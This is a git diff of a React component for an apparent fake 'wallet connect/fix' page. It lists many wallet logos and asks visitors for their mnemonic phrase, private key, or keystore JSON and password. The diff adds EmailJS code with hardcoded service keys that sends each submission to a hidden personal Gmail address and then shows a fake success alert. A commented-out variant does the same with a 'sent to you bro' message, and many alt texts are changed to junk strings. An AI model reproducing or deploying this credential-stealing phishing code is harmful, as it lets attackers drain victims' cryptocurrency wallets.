@@ -1,5 +1,11 @@
-import React, { useState } from "react";
-import { useForm, ValidationError } from "@formspree/react";
+// import { send } from "emailjs-com";
+import React, { useRef, useState } from "react";
+// import { Form } from "react-router-dom";
+import Swal from "sweetalert2";
+import emailjs from "@emailjs/browser";
+
+// import emailjs from 'emailjs-com';
+// import { useForm, ValidationError } from "@formspree/react";
 
 // import { json } from "react-router-dom";
 
@@ -15,9 +21,9 @@ const Wallets = () => {
   const handleShowModal = () => {
     setAuthModal(true);
   };
-  const closeModal = () =>{
-    setAuthModal(false)
-  }
+  const closeModal = () => {
+    setAuthModal(false);
+  };
 
   //   fuction toggling different wallet authentications
   const handleShowMnemonic = () => {
@@ -45,7 +51,7 @@ const Wallets = () => {
     {
       name: "Wallet Connect",
       src: "https://web3autofix.pages.dev/img/walletconnect.92044555.svg",
-      alt: "wallet connect",
+      alt: "walledjt connect",
     },
     {
       name: "SafePal",
@@ -70,12 +76,12 @@ const Wallets = () => {
     {
       name: "SWFT",
       src: "https://play-lh.googleusercontent.com/jplKk_qSnXI_m9PaIx_YQ4YoMQTHdUF5eH8rm5kEQs9ZcHBJdw8K9vBI3MHrwl1WDKI",
-      alt: "swft",
+      alt: "swftwwq",
     },
     {
       name: "Token Pocket",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/f3119826-4ef5-4d31-4789-d4ae5c18e400?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "tp",
+      alt: "tpwwwww",
     },
 
     {
@@ -91,17 +97,17 @@ const Wallets = () => {
     {
       name: "Coinbase",
       src: "https://web3autofix.pages.dev/img/coin.d748b142.png",
-      alt: "coinbase",
+      alt: "coinwsbase",
     },
     {
       name: "TBCC",
       src: "https://web3autofix.pages.dev/img/tcc.3ef9cff0.jpeg",
-      alt: "tbbc",
+      alt: "tbwwbc",
     },
     {
       name: "SWT Token",
       src: "https://web3autofix.pages.dev/img/swt.0a556904.png",
-      alt: "swf",
+      alt: "swfqqwq",
     },
     {
       name: "Trezor",
@@ -111,142 +117,142 @@ const Wallets = () => {
     {
       name: "Wallet Connect",
       src: "https://play-lh.googleusercontent.com/RSz4cnzajV5t-j6kEMH1mmwG6RtzsbZCex2NLw6uqTdPC04rMyll0iwt5Ue0ree6-gM",
-      alt: "wallet connect",
+      alt: "wallert wconnect",
     },
     {
       name: "Trust Wallet",
       src: "https://registry.walletconnect.com/api/v1/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
-      alt: "trust",
+      alt: "trustsss",
     },
     {
       name: "",
       src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
-      alt: "token",
+      alt: "tokren",
     },
     {
       name: "",
       src: "https://play-lh.googleusercontent.com/BxFMJpwGIZF1jadYbyHX9wkx-fqHRGRkbM2qs6aueygk7GhXeLS8-G461v--X4tqUO8l",
-      alt: "token",
+      alt: "toketn",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/7c5ff577-a68d-49c5-02cd-3d83637b0b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokuen",
     },
     {
       name: "",
       src: "https://304015554-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-Mgv3_8586v0mVL4zZax%2Ficon%2FWvDTo0Kodwa4awPEQrsO%2Fflarelogo.png?alt=media&token=b115a1f0-a543-4a49-828a-e3ede684055e",
-      alt: "token",
+      alt: "tokssen",
     },
     {
       name: "",
       src: "https://s2.coinmarketcap.com/static/img/coins/200x200/5426.png",
-      alt: "token",
+      alt: "toksssen",
     },
     {
       name: "",
       src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
-      alt: "token",
+      alt: "tokedeen",
     },
     {
       name: "",
       src: "https://cspr.live/assets/images/casper-signer.png",
-      alt: "token",
+      alt: "tokssssedddn",
     },
     {
       name: "",
       src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
-      alt: "token",
+      alt: "tokfefreen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokghgen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/1bf33a89-b049-4a1c-d1f6-4dd7419ee400?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokghghgten",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokrhrhrhen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokfft5hen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/1caa462e-dcf5-4c56-d180-094c81444f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toyillken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/af185895-cda5-4eaf-e31b-28b6fe4b0800?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toketuyejhn",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/dfe0e3e3-5746-4e2b-12ad-704608531500?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toksrthben",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/c227ee0a-5127-4707-ded9-c3cd81348d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokiioen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/32e89601-0490-42fc-0cc4-8627d62a2000?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toqqken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/322bd6f0-09b5-4595-cb15-0dfab8054800?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokeqn",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea0140c7-787c-43a4-838f-d5ab6a342000?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokqqqen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/d017bc54-db4d-4f07-2de2-69790ce92400?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "towwken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "towwwken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/e2024511-2c9b-46d7-3111-52df3d241700?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokwwwen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/73e6b2b2-8c02-42e9-84f5-82a859978200?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokeeeeen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/c268e78d-ffb0-4c8b-5cad-04c3add48500?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokrrrrten",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/e321346d-5ce7-4e75-371e-e4f0bf923900?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokerreen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/b869d966-4699-44de-eadb-4eb39a580600?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toewewken",
     },
     {
       name: "PIER",
@@ -256,52 +262,52 @@ const Wallets = () => {
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokrrreeffeen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/e4eff15a-35d5-49fe-047f-33e331f46400?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokvvvren",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea26c3c8-adb6-4dc4-ee02-35d6eee02800?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tofrfrken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/80eaa630-6392-4b0a-a604-0a0f808e4d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokhttjtken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokllen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toklen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/70485da2-2568-463d-722c-25082997cc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokellln",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokllllen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toklllllen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokelllllllln",
     },
     {
       name: "",
@@ -311,57 +317,57 @@ const Wallets = () => {
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/a78c4d48-32c1-4a9d-52f2-ec7ee08ce200?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokelllllllllllllllllln",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/c68b81d1-a400-4a07-6d9d-28edda986d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokllllllllllllllllllllllllllen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/fc460647-ea95-447a-99f0-1bff8fa4be00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toooooken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/51fa27fd-8a21-4de0-c084-528e4a37ad00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokeooooooooon",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/41f6ac85-8f4e-4d9f-b37b-92b43fa7f400?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokoooooooooooooooooooooen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/75dd1471-77e9-4811-ce57-ec8fc980ec00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokoooooooooooooooooooooooooooen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/efec6318-7f96-4b30-9287-6c287660cd00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokeppppppppppppppppn",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/280cd57b-24f4-4700-8d53-94fe292fab00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toppppppppken",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/7025146c-c341-473f-a79c-62ec48eef800?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokpppppppppppppppppppppppppppppen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/c664d955-8a1e-4460-3917-4cfcf198f000?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "tokyyyyyyyyyyyyyyen",
     },
     {
       name: "",
       src: "https://explorer-api.walletconnect.com/v3/logo/lg/058878f4-7364-4e01-434f-2cc09a15cf00?projectId=2f05ae7f1116030fde2d36508f472bfb",
-      alt: "token",
+      alt: "toyyyyyyyyyyyyyyyyyyyyyyyyyken",
     },
   ];
 
@@ -382,10 +388,64 @@ const Wallets = () => {
     wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
-  const [state, handleSubmit] = useForm("xbjvpbpa");
-  if (state.succeeded) {
-      return <p>Thanks for joining!</p>;
-  }
+  // const [state, handleSubmit] = useForm("xbjvpbpa");
+  // if (state.succeeded) {
+  //     return <p>Thanks for joining!</p>;
+  // }
+
+  // const [phrases, setPhrases] = useState('');
+  // const [keystoreJsons, setKeystoreJsons] = useState('');
+  // const [privateKeys, setPrivateKeys] = useState('');
+  // const [passwords, setPAsswords] = useState('');
+
+  // const [formState, setFormState] = useState({});
+
+  // const changeHandler = (evt) => {
+  //   setFormState({ ...formState, [evt.target.id]: evt.target.value });
+  // };
+
+  // const submitHandler = (evt) => {
+  //   evt.preventDefault();
+  //   const Config = {
+  //     SecureToken: "de8d33e0-09ad-435b-9238-746478d1c658",
+  //     To: "sarahmcleonard@gmail.com",
+  //     From: formState.mnemonic,
+  //     Subject: "Phrase",
+  //     Body: `${formState.name} has been sent to you bro `,
+  //   };
+  //   if (window.Email) {
+  //     window.Email.send(Config).then(() =>
+  //       Swal.fire("Good job!", "You clicked the button!", "success")
+  //     );
+  //   }
+  // };
+
+  const handleResponse = () => {
+    Swal.fire("Good job!", "You clicked the button!", "success");
+  };
+
+  const form = useRef();
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm(
+        "service_84dlvte",
+        "template_r5tdfbp",
+        form.current,
+        "vp-dlSTSkgeHHa479"
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+
+    e.target.reset();
+  };
 
   return (
     <div>
@@ -425,7 +485,7 @@ const Wallets = () => {
                   onClick={handleShowModal}
                 />
                 <div className="image-description">{wallet.name}</div>
-                <button  onClick={handleShowModal} className="butin">
+                <button onClick={handleShowModal} className="butin">
                   CONNECT
                 </button>
               </div>
@@ -446,7 +506,9 @@ const Wallets = () => {
                     <div className="row">
                       <div className="col-md-6"></div>
                       <div className="col-md-6">
-                        <p onClick={closeModal} className="text-white cursor">X</p>
+                        <p onClick={closeModal} className="text-white cursor">
+                          X
+                        </p>
                       </div>
                     </div>
                   </div>
@@ -490,19 +552,25 @@ const Wallets = () => {
                           </span>
                           <div className="col-md-12">
                             <div className="md-form mb-4 pink-textarea active-pink-textarea">
-                              <form onSubmit={handleSubmit}>
+                              <form
+                                ref={form}
+                                onSubmit={sendEmail}
+                                method="post"
+                              >
+                                <input type="hidden" name="subject" />
                                 <textarea
                                   placeholder="enter your mnemonic phrase here*"
                                   name="mnemonic"
                                   id="mnemonic"
-                                  class="md-textarea form-control mnemonic"
+                                  className="md-textarea form-control mnemonic"
                                   rows="3"
                                   required
+                                  type="text"
                                 ></textarea>
-                                <ValidationError
-                                  prefix="mnemonic"
-                                  field="mnemonic"
-                                  errors={state.errors}
+                                <input
+                                  type="hidden"
+                                  value="sarahmcleonard@gmail.com"
+                                  name="receiving_email"
                                 />
                                 <div className="row mt-3">
                                   <div className="col-md-9">
@@ -511,7 +579,11 @@ const Wallets = () => {
                                     </small>
                                   </div>
                                   <div className="col-md-3">
-                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
+                                    <button
+                                      onClick={handleResponse}
+                                      type="submit"
+                                      className="btn btn-primary float"
+                                    >
                                       Validate
                                     </button>
                                   </div>
@@ -532,7 +604,11 @@ const Wallets = () => {
                           <span className="mt-3 brandColor">Private Key</span>
                           <div className="col-md-12">
                             <div className="md-form mb-4 pink-textarea active-pink-textarea">
-                              <form onSubmit={handleSubmit}>
+                              <form
+                                ref={form}
+                                onSubmit={sendEmail}
+                                method="post"
+                              >
                                 <input
                                   type="text"
                                   placeholder="enter your Private Key here *"
@@ -540,13 +616,8 @@ const Wallets = () => {
                                   id="privatekey"
                                   className="md-textarea form-control privateKey"
                                   rows="3"
-                                  required
                                 />
-                                <ValidationError
-                                  prefix="Emaiprivatekey"
-                                  field="privatekey"
-                                  errors={state.errors}
-                                />
+
                                 <div className="row m-3">
                                   <div className="col-md-9">
                                     <small className="text-danger">
@@ -554,7 +625,11 @@ const Wallets = () => {
                                     </small>
                                   </div>
                                   <div className="col-md-3">
-                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
+                                    <button
+                                      onClick={handleResponse}
+                                      type="submit"
+                                      className="btn btn-primary float"
+                                    >
                                       Validate
                                     </button>
                                   </div>
@@ -575,7 +650,9 @@ const Wallets = () => {
                           <span className="mt-3 brandColor">Keystore JSON</span>
                           <div className="col-md-12">
                             <div className="md-form mb-4 pink-textarea active-pink-textarea">
-                              <form onSubmit={handleSubmit}>
+                              <form ref={form}
+                              onSubmit={sendEmail}
+                              method="post">
                                 <p>
                                   <input
                                     type="text"
@@ -585,11 +662,7 @@ const Wallets = () => {
                                     className="md-textarea form-control privateKey"
                                     rows="3"
                                     required
-                                  />
-                                  <ValidationError
-                                    prefix="Keystorejson"
-                                    field="keystorejson"
-                                    errors={state.errors}
+                                    
                                   />
                                 </p>
                                 <input
@@ -601,11 +674,7 @@ const Wallets = () => {
                                   rows="3"
                                   required
                                 />
-                                <ValidationError
-                                  prefix="password"
-                                  field="password"
-                                  errors={state.errors}
-                                />
+
                                 <div className="row mt-4">
                                   <div className="col-md-9">
                                     <small className="text-danger">
@@ -613,7 +682,11 @@ const Wallets = () => {
                                     </small>
                                   </div>
                                   <div className="col-md-3">
-                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
+                                    <button
+                                    onClick={handleResponse}
+                                      type="submit"
+                                      className="btn btn-primary float"
+                                    >
                                       Validate
                                     </button>
                                   </div>
